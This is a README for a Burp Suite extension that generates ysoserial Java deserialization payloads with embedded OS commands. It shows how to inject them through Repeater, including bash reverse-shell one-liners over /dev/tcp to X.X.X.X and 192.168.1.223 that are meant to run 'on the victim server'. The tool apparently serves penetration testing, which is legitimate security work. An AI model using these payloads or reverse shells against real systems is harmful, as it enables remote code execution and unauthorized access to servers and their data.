# burp-ysoserial - with complex command in injection support


There are 3 ways to run this extension. 

 1. Generate a payload from the YSOSERIAL Tab. You can then copy and paste it into other tabs in burp.(Not ideal)
 1. Generate a payload from the YSOSERIAL Tab. In another tab you can select the text you want to replace and right click. You have 3 options to replace.
   1. Raw - This will replace your selected text with an unencoded version of the payload. This is raw binary/hex.
   1. B64 - This payload will replace your selected text with a base64 encoded version.
   1. URLEnc - This will replace your selected text with a URL encoded and base64 encoded payload. Ideal for web type applications
 1. You can use inline commands to replace your text with a payload that contains your command. For example you can enter text in repeater like:
 
 ```$(CC1|ping -c1 8.8.8.8)```
 
 Select the above text and right click any of the Java Serialized Payload Options and it will replace your command with a payload containing that command.
 
 The first parameter before the pipe in the above statement is the verion of the exploit. You can enter any of the following:
  - CC1 or CollectionCommons1
  - CC2 or CollectionCommons2
  - GV1 or Groovy1
  - SP1 or Spring1
 The second parameter is obviously the OS command you wish to run.
 
## Complex Commands (i.e. pipes and I/O redirection)
Note ysoserial in this extension has been updated to accept more complicated commands that in the original. For instance commands like the following command would fail to execute on the victim server in the original ysoserial application.
 
```echo test > /tmp/text.txt```
  or
```bash -c "echo test > /tmp/text.txt"```
 
This is because to run complex commands that pipe command into other commands in java the arguments needs to be a string Array. This version of ysoserial has been modified by using a delimter of ",," to seperate your arguments to the string array.  Here is an example of running a more complicated command using this method to get a reverse shell: 
  
 ```/bin/bash,,-c,,bash -i >& /dev/tcp/X.X.X.X/9997 0>&1```
 
The above code will be split into a string array that java can run on the victim server. :) The resulting java code would look like:
```Runtime.getRuntime().exec(new String[]{"/bin/bash", "-c", "bash -i >& /dev/tcp/X.X.X.X/9997 0>&1"});```

##Examples
### Example 1 - Replace selected text with a pre-generated payload
1. First Generate a payload
![Payload Generator](/Payload%20Generator.png)
2. Go to Repeater and select the text you want to replace.
3. Right Click and select a payload option.
![Payload Generator](/replace%20with%20generated.png)

### Example 2 - Use and inline command
1. In Burp Repeater replace your parameter with the following code:
 ```$(CC1|ping -c1 8.8.8.8)```
2. Select the above text. Right Click in repeater and select the payload type.
![Payload Generator](/inline-command.png)

### Example 3 - Complex commands 
1. In Repeater replace your parameter with the following command:
```$(CC1|/bin/bash,,-c,,bash -i >& /dev/tcp/192.168.1.223/9997 0>&1)```
2. Select it and select the payload you want to generate.
![Payload Generator](/inline%20complex%20command.png)
